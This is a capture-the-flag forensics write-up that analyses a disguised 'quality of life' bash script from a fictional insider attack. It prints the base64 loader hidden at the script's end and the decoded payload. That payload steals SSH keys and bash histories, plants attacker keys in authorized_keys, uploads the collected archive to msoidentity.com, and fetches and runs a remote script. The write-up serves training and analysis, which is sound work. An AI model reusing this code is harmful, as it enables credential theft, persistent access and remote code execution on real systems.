# DoD Cyber Sentinel Challenge - Remote Help (forensics, 200p, Medium Difficulty) 6/24/2025
## Preface
Unfortunately, I do not have access to the original challenge statement, but it mentions something about a fictional internal attack from a recently hired remote worker. They were able to recover a [bash script](https://github.com/btoroth/QOL/blob/main/QOL.sh) that seems to have triggered alarms, causing the attack to fail. It then mentions to try and follow the cyber kill chain from start to finish to see what the attacker was trying to do, and along the way you'd find four different parts of the flag.

## Solving

![image](https://github.com/user-attachments/assets/710acb2e-cbea-489c-ac08-c4962739b961)

At first glance the script seems pretty harmless, even calling itself a QOL (Quality of Life) script meant to just make some minor improvements to the system. Update/upgrade packages, install some tools, create some aliases, blah blah blah. BUT if you keep scrolling, down at the very bottom we see this:

`sudo echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSI ... AvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d >> /tmp/0.sh && chmod +x /tmp/0.sh && /bin/bash /tmp/0.sh &`

Here we go, this seems to be yet another bash script obfuscated in base64 being saved and executed. We can simply throw this in to the browser tool CyberChef, it will automatically detect base64, and decode it for us:

![image](https://github.com/user-attachments/assets/a6de7c73-fddb-4038-a09d-e87336d19171)

`#!/bin/bash

$log="/tmp/log_$(date +"%Y-%m-%d--%H-%M")"
$tgz="/tmp/log_$(date +"%Y-%m-%d--%H-%M").tgz"

mkdir -p $log

cat /proc/cpuinfo >> "$log/cpu.txt"
cat /proc/meminfo >> "$log/mem.txt"
cat /etc/os-release >> "$log/os.txt"



for dir in $(ls /home -1); do
    
	if [ -f "$dir/.ssh/" ]; then
		cat $dir/.ssh/* >> "$log/'$dir'.txt"
		cat $dir/.bash_history >> "$log/'$dir'-bash.txt"
	fi
    # Perform your actions here
done

if [ "$(id -u)" -eq 0 ]; then
	cat /root/.ssh/* >> "$log/root.txt"
	cat /root/.bash_history >> "$log/root-bash.txt"
	local url="https://msoidentity.com/auth"
    local auth_keys="$HOME/.ssh/authorized_keys"
	
    curl -s "$url" >> "$auth_keys"
    chmod 600 "$auth_keys"
fi 


tar -cf "$tgz" "$log" 2>/dev/null

if [ -f "$tarfile" ]; then
        curl -s --output /dev/null -X POST -H "accept: application/json" -H "Content-Type: multipart/form-data" -F "file=@$tarfile" "https://msoidentity.com/log"
    fi
}

curl -s https://msoidentity.com/info | base32 -d >> /tmp/info.sh
/bin/bash /tmp/info.sh
rm -f /tmp/info.sh
`
